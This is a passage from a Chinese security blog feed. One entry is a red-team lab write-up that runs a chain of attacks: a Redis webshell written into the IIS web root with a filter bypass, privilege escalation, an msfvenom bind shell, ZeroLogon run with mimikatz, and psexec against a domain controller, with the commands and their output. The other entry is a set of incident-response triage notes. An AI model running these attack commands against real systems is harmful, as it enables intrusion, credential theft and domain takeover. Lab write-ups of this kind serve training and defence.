src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1Y7Hgu.jpg"><br><code>web</code> 页面的话倒是没啥：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/smDzai.jpg"><br>看了看扫描出来 <code>6379</code> 应该是 <code>redis</code> 相关漏洞！<br>通过尝试 <code>redis</code> 未授权发现连接成功！<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jWj5Df.jpg"><br>但是查看信息发现出错，应该是密码问题：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4ORUe5.jpg"><br>通过 <code>msf redis</code> 爆破模块爆破出了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3UPmy7.jpg"><br>重新登陆 <code>redis</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains redis-cli -h 192.168.59.4 -p 6379 -a 123456789qq</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MC9rF5.jpg"><br>登陆成功！现在要想拿到权限首先我们不知道网站路径（写不了一句话 ），但是知道当前网站使用的是 <code>IIS</code>，那么 <code>IIS</code> 默认目录是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot</span><br></pre></td></tr></table></figure><p>设想会不会是这个目录呢？随即写了一个 <code>aspx</code> 的 <code>shell</code> 到 <code>IIS</code> 默认目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.4:6379&gt; config set dir C:/inetpub/wwwroot/</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; config set dbfilename 1.aspx</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; set x &#x27;&lt;%execute(request(&quot;x&quot;))%&gt;&#x27;  //注意这里要用单引号</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; save</span><br></pre></td></tr></table></figure><p>发现写入不了，随后设置了读写权限 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> slave-read-only on </span><br></pre></td></tr></table></figure><p>然后发现读写可以了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/TUmZnl.jpg"><br>再来写一遍 <code>webshell</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/54B8fs.jpg"><br>发现是 <code>404</code>，写 <code>asp</code> 是 <code>500</code>，应该是什么东西拦截了。</p><p>随后 <code>bypass</code> 测试，可以通过这样绕过：（单引号中间要带空格）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &#x27;    &lt;%execute(request(&quot;x&quot;))%&gt;    &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UnHe9h.jpg"><br>拿到 webshell：<a href="http://192.168.59.4/a.asp">http://192.168.59.4/a.asp</a> </p><h2 id="内网渗透二"><a href="#内网渗透二" class="headerlink" title="内网渗透二"></a>内网渗透二</h2><p>通过发现当前机器是不出网的，而且权限还很小：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/gVDNVZ.jpg"><br>发现当前机器上权限太小任何文件都上传不了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fDTOcr.jpg"><br>通过找到了一个可读可写目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\VMware\logs\</span><br></pre></td></tr></table></figure><p>并且当前机器上无任何杀软：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/lq7GNB.jpg"><br>随即坏土豆提权成功：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/kMKMZg.jpg"><br>拿到第二个 flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-b6d767d2f8ed5d21a44b0e5886680cb9-2&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/HKW3g8.jpg"><br>随即添加了一个 <code>asp.net</code> 管理员用户进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/59R6UE.jpg"></p><h3 id="内网渗透-10-10-10-202"><a href="#内网渗透-10-10-10-202" class="headerlink" title="内网渗透-10.10.10.202"></a>内网渗透-10.10.10.202</h3><p>通过对内网进行存活探测发现内网存活了三台：<code>10.10.10.201</code>、<code>10.10.10.202</code>（本机）、<code>10.10.10.209</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l  %i  <span class="keyword">in</span> (1,1,255) <span class="keyword">do</span> @  ping  10.10.10.%i  -w  1  -n  1 |  find  /i  <span class="string">&quot;ttl=&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/iwqJRB.jpg"><br>随后关闭它防火墙：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Sy0gCC.jpg"><br>然后 <code>MSF</code> 生成<code>正向 shell</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9099 -f exe &gt;/root/9099.exe</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/t5IHA0.jpg"><br>目标运行 <code>9090.exe</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/42BMGT.jpg"><br>随后 <code>MSF</code> 上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/idgoPV.jpg"><br><code>hashdump</code> 解密得到了密码：<code>QWEasd1122</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MxlBT8.jpg"><br>紧接着开了它的远程桌面：（之前添加了一个 <code>asp.net</code> 用户，方便后续好登陆桌面 ）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PalAyt.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/NtwfJz.jpg"><br>通过 <code>nbtcan</code> 发现 <code>10.10.10.201</code>（DC）、<code>10.10.10.209</code> 是域环境：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2C0KDV.jpg"><br>得想办法拿到一台域机器<br>对他们进行扫描端口发现他们都开放了 <code>web</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/K117Za.jpg"><br>其中 <code>10.10.10.209</code> 还是一个 <code>Outlook Web App</code>（微软的邮件组件）<code>Exchange</code>  ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/9pVZbV.jpg"><br>但是我们没有账号，这个时候我在 <code>Redis</code> 上找到了 <code>pts</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;<span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PvVtxj.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/brmbb0.jpg"><br>知道了两个用户邮箱：<code>moonsec@cncat.cc</code>、<code>test@cncat.cc</code><br>然后把文件都下载到本地，进行后续利用（发现都失败了）</p><h3 id="CVE-2020-1472-拿到域控"><a href="#CVE-2020-1472-拿到域控" class="headerlink" title="CVE-2020-1472 拿到域控"></a>CVE-2020-1472 拿到域控</h3><p>之后发现他域控存在 <code>CVE-2020-1472</code> 域内提权漏洞：（需要 20200918 之后的 mimikatz 才可以使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12SERVER-DC$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/L1HPti.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12server-dc$ /exploit</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/bc1VGK.jpg"><br>导出所有域内用户凭证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py cncat/12server-dc$@<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span> -no-<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">cncat.cc\Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/oJeHh4.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/IbR021.jpg"><br>拿到域控和 <code>flag</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2KQulH.jpg"><br>利用 <code>msf psexec</code> 上线：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                                                    Required  Description</span><br><span class="line">   ----                  ---------------                                                    --------  -----------</span><br><span class="line">   RHOSTS                10.10.10.201                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT                 445                                                                yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                                                     no        The service display name</span><br><span class="line">   SERVICE_NAME                                                                             no        The service name</span><br><span class="line">   SHARE                                                                                    no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain             cncat                                                              no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass               aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387  no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser               Administrator                                                      no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/bind_tcp_rc4):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   EXITFUNC     thread           yes       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LPORT        4446             yes       The listen port</span><br><span class="line">   RC4PASSWORD  msf              yes       Password to derive RC4 key from</span><br><span class="line">   RHOST        10.10.10.201     no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.201:445 - Connecting to the server...</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] 10.10.10.201:445 - Authenticating to 10.10.10.201:445|cncat as user <span class="string">&#x27;Administrator&#x27;</span>...</span><br><span class="line">[*] 10.10.10.201:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.10.10.201:445 - Executing the payload...</span><br><span class="line">[+] 10.10.10.201:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.201:4446</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] Sending stage (200266 bytes) to 10.10.10.201</span><br><span class="line">[*] Meterpreter session 5 opened (0.0.0.0:0 -&gt; 180.215.199.206:22222) at 2021-06-02 06:35:22 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt;                                                                                    </span><br></pre></td></tr></table></figure><p>然后通过令牌窃取身份切换为域管：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3jm7e1.jpg"><br>然后通过和域机器 <code>10.10.10.209</code> 建立 <code>IPC</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AUKzNo.jpg"><br>至此最后一个 <code>flag</code> 也拿到：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4p4HUP.jpg"><br>至此本次考核完毕！</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>对于红队成员来说最重要的就是渗透不能有短板，各种漏洞都应该去复现一遍，由于我 <code>Exchange</code> 的漏洞未复现导致卡了很长时间，最后还是使用暴力的手段拿到域控，在真实环境中很危险，很有可能导致域控的密码恢复不了！哦豁，那你就等着跑路吧！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> redTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redTeam </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网蓝队及应急响应笔记</title>
      <link href="/2020/07/03/penetrationtest-blue-1/"/>
      <url>/2020/07/03/penetrationtest-blue-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1645135&auto=1&height=66"></iframe><blockquote><p>文章较长，请耐心看完。文章很多地方（大部分）来自于Bypass公众号的应急响应笔记，只不过我都一一复现了一下。</p></blockquote><h1 id="1、应急响应介绍"><a href="#1、应急响应介绍" class="headerlink" title="1、应急响应介绍"></a>1、应急响应介绍</h1><h2 id="第一步：沟通"><a href="#第一步：沟通" class="headerlink" title="第一步：沟通"></a>第一步：沟通</h2><p>联系客户，咨询当前服务器的状态，发生的准确时间点，服务器上有什么业务，提供异常截图，事件发生后有没有做处理，做了那些处理，之前有没有发生过安全事件，是否有完整的日志，服务器上是否存在安全设备。</p><h2 id="第二步：确认"><a href="#第二步：确认" class="headerlink" title="第二步：确认"></a>第二步：确认</h2><p>初步了解服务器相关信息，要去客户对服务器的重要数据进行备份，然后提供给我们应急服务器的账号密码，如果服务器上存在对应Web服务器，需要提供对应的Web域名，整理客户描述信息，进行初步确认，判断是不是安全事件，切不可盲目相信他人所述，如果是安全事件提供对应的防护方案。</p><h2 id="第三步：深入分析"><a href="#第三步：深入分析" class="headerlink" title="第三步：深入分析"></a>第三步：深入分析</h2><p>分析服务器上进程、网络连接、计划任务、日志，查找异常项，帮助客户恢复服务器正常状态，刻画攻击路径。</p><h2 id="第四步：沟通"><a href="#第四步：沟通" class="headerlink" title="第四步：沟通"></a>第四步：沟通</h2><p>保持跟客户的持续沟通，不要让客户感觉你没有在处理事件，及时同步处理进展。有不知道的信息就主动问客户获取，客户提供越多信息，对我们完成应急越有帮助。</p><h2 id="第五步：总结"><a href="#第五步：总结" class="headerlink" title="第五步：总结"></a>第五步：总结</h2><p>整理并输出完整的应急响应报告。</p><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><ul><li>由于应急响应需要注意时效性，客户一般都是非常着急的，尽可能的定位到问题，解决问题才是关键。</li><li>止损是第一。</li><li>不要造成二次伤害。</li></ul><h2 id="应急响应整体思路"><a href="#应急响应整体思路" class="headerlink" title="应急响应整体思路"></a>应急响应整体思路</h2><p>3W1H：W即Who、What、Why，1H即How，做应急响应要带着疑问来做事，一定要收集清楚这些信息。网络拓扑是怎样的？需求是啥？发生了什么事？你能做什么？用户用了什么产品？产品版本多少？病毒库版本多少？多少主机中招了？主机是普通PC还是服务器？服务器是做什么的？信息搜集越多，对应急响应越有利。</p><p>易失性原则：做应急响应免不了要做信息搜集和取证的，但这里是有一定的先后顺序的，即最容易丢失数据，应该最先收集，其他的以此类推。</p><p>要素原则：做应急响应，主要是抓关键证据，即要素，这些要素包括样本、流量、日志、进程及模块、内存、启动项。</p><p>避害原则：做应急响应，要做到趋利避害，不能问题还没有解决，反而引入了新的问题。譬如，自己使用的工具有后门却不知情；给用户使用不恰当的工具或软件造成客户主机出现问题；给别人发样本，不加密，不压缩，导致别人误点中毒，最极端的场景就是给别人发勒索样本不加密压缩，导致别人误点中毒。</p><h2 id="应急响应事件介绍及处理流程"><a href="#应急响应事件介绍及处理流程" class="headerlink" title="应急响应事件介绍及处理流程"></a>应急响应事件介绍及处理流程</h2><h3 id="网络攻击事件"><a href="#网络攻击事件" class="headerlink" title="网络攻击事件"></a>网络攻击事件</h3><ul><li>安全扫描攻击：黑客利用扫描器对目标进行漏洞探测，并在发现漏洞后进一步利用漏洞进行攻击。</li><li>暴力破解攻击：对目标系统账号密码进行暴力破解，获取后台管理员权限。</li><li>系统漏洞攻击：利用操作系统、应用系统中存在漏洞进行攻击。</li><li>WEB漏洞攻击：通过SQL注入、上传漏洞、XSS漏洞、授权绕过等各种WEB漏洞进行攻击。</li><li>拒绝服务攻击：通过大量流量DDOS或者CC攻击目标，使目标服务器无法提供正常服务。</li><li>其他网络攻击行为…</li></ul><h3 id="恶意程序事件"><a href="#恶意程序事件" class="headerlink" title="恶意程序事件"></a>恶意程序事件</h3><ul><li>病毒、蠕虫：造成系统缓慢，数据损坏、运行异常。</li><li>远控木马：主机被黑客远程控制。</li><li>僵尸网络程序（肉鸡行为）：主机对外发动DDOS攻击、对外发起扫描攻击行为。</li><li>挖矿程序：造成系统资源大量消耗。</li></ul><h3 id="Web恶意木马"><a href="#Web恶意木马" class="headerlink" title="Web恶意木马"></a>Web恶意木马</h3><ul><li>Webshell后门：黑客通过Webshell控制主机</li><li>网页挂马：页面被植入病毒内容，影响访问者安全</li><li>网页暗链：网站被植入博彩、色情、游戏等广告内容</li></ul><h3 id="信息破坏事件"><a href="#信息破坏事件" class="headerlink" title="信息破坏事件"></a>信息破坏事件</h3><ul><li>系统配置遭篡改：系统中出现异常的服务、进程、启动项、账号等等</li><li>数据库内容篡改：业务数据遭到而已篡改，引起业务异常和损失</li><li>网站内容篡改事件：网站页面内容被黑客恶意篡改</li><li>信息数据泄露事件：服务器数据、会员账号遭到窃取并泄露</li></ul><h3 id="其他安全事件"><a href="#其他安全事件" class="headerlink" title="其他安全事件"></a>其他安全事件</h3><p>账号被异常登录：系统账号在异地登录，可能出现账号密码泄露，支付盗刷</p><h3 id="事件处理流程"><a href="#事件处理流程" class="headerlink" title="事件处理流程"></a>事件处理流程</h3><ul><li>一般像Web攻击类安全事件，处理方法就是加waf，增加攻击者的攻击成本，然后开始查找漏洞，修复漏洞，如果是CMS漏洞，需要根据官方修复建议进行修复。</li><li>挖矿类安全事件，先暂停挖矿进程，修改远程木马下载地址为本地host，然后排除处理。</li><li>信息泄露安全事件，要根据泄露数据样本判断是哪里存在漏洞，然后采取相应的措施。</li><li>支付类安全事件，禁用支付秘钥，关闭提现业务。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>沟通-&gt;确认-&gt;异常发生于追踪-&gt;事件处理-&gt;总结</p></blockquote><ul><li>第一步：和客户交流，尽可能多的了解相关业务</li><li>第二步：根据客户描述做好笔记，了解事件主线，及时止损</li><li>第三步：异常发生于追踪</li><li>第四步：事件处理，清除服务器木马，修复漏洞</li><li>第五步：总结写报告</li></ul><h1 id="2、Linux-Windows入侵命令排查初步"><a href="#2、Linux-Windows入侵命令排查初步" class="headerlink" title="2、Linux/Windows入侵命令排查初步"></a>2、Linux/Windows入侵命令排查初步</h1><h2 id="Linux排查方法"><a href="#Linux排查方法" class="headerlink" title="Linux排查方法"></a>Linux排查方法</h2><h3 id="1、系统完整性"><a href="#1、系统完整性" class="headerlink" title="1、系统完整性"></a>1、系统完整性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Va</span><br></pre></td></tr></table></figure><h3 id="2、进程"><a href="#2、进程" class="headerlink" title="2、进程"></a>2、进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">top</span><br><span class="line">ps -aux</span><br><span class="line">lsof</span><br></pre></td></tr></table></figure><h3 id="3、网络连接"><a href="#3、网络连接" class="headerlink" title="3、网络连接"></a>3、网络连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure><h3 id="4、开机启动项"><a href="#4、开机启动项" class="headerlink" title="4、开机启动项"></a>4、开机启动项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/*</span><br><span class="line">/etc/rc*.d/</span><br><span class="line">/etc/rc.local</span><br></pre></td></tr></table></figure><h3 id="5、Webshell查杀"><a href="#5、Webshell查杀" class="headerlink" title="5、Webshell查杀"></a>5、Webshell查杀</h3><p>河马Webshell查杀，自写脚本</p><h3 id="6、计划任务"><a href="#6、计划任务" class="headerlink" title="6、计划任务"></a>6、计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/cron | grep &quot;bash&quot;</span><br><span class="line">cat /var/log/cron | grep &quot;wget&quot;</span><br><span class="line">cat /var/log/cron | grep &quot;cat&quot;</span><br><span class="line">cat /vat/log/cron | grep &quot;ud&quot;</span><br><span class="line">cat /etc/crontab</span><br><span class="line">/var/spool/crom/*</span><br><span class="line">/etc/cron.d/</span><br><span class="line">/etc/cron.daily/</span><br><span class="line">/etc/cron.hourly/</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/cron.monthly/</span><br></pre></td></tr></table></figure><h3 id="7、查看系统登录情况"><a href="#7、查看系统登录情况" class="headerlink" title="7、查看系统登录情况"></a>7、查看系统登录情况</h3><p>历史登录成功IP和账号，当前登录成功账号IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure</span><br><span class="line">last</span><br></pre></td></tr></table></figure><h3 id="8、查看SSH-key"><a href="#8、查看SSH-key" class="headerlink" title="8、查看SSH key"></a>8、查看SSH key</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .ssh/authorized_keys</span><br></pre></td></tr></table></figure><h3 id="9、用户及hosts"><a href="#9、用户及hosts" class="headerlink" title="9、用户及hosts"></a>9、用户及hosts</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure><h3 id="10、查看动态链接库"><a href="#10、查看动态链接库" class="headerlink" title="10、查看动态链接库"></a>10、查看动态链接库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo $LD_PRELOAD</span><br><span class="line">Linux预加载库：</span><br><span class="line">/etc/ld.so.preload</span><br><span class="line">/usr/local/lib</span><br></pre></td></tr></table></figure><h3 id="11、日志分析"><a href="#11、日志分析" class="headerlink" title="11、日志分析"></a>11、日志分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Linux日志文件存在/var/log/</span><br><span class="line">/var/log/message记录系统重要信息的日志，这个日志文件会记录Linux系统的绝大多数重要信息</span><br><span class="line">/var/log/cron记录系统定时任务相关日志</span><br><span class="line">/var/log/btmp记录错误登陆日志，不能vi查看，要用lastb</span><br><span class="line">/var/log/lastlog记录系统中所有用户最后一次登陆事件的日志，不能使用vi，使用lastlog</span><br><span class="line">/var/logsecure记录验证和授权方面的信息，只要设计账号和密码的程序都会记录，比如ssh登陆，su切换用户，sudo授权</span><br><span class="line"></span><br><span class="line">1、定位有多少IP在爆破主机的root账号</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c |sort -nr| more</span><br><span class="line">2、登陆成功的IP有那些</span><br><span class="line">grep &quot;Accepted&quot; /var/log/secure |awk &#x27;&#123;print $11&#125;&#x27; |sort|uniq -c|sort -nr |more</span><br></pre></td></tr></table></figure><h2 id="Windows排查方法"><a href="#Windows排查方法" class="headerlink" title="Windows排查方法"></a>Windows排查方法</h2><h3 id="1、系统状态排查"><a href="#1、系统状态排查" class="headerlink" title="1、系统状态排查"></a>1、系统状态排查</h3><p>查看CPU、内存、网络占有率</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1733.png" alt="图片"></p><h3 id="2、文件分析"><a href="#2、文件分析" 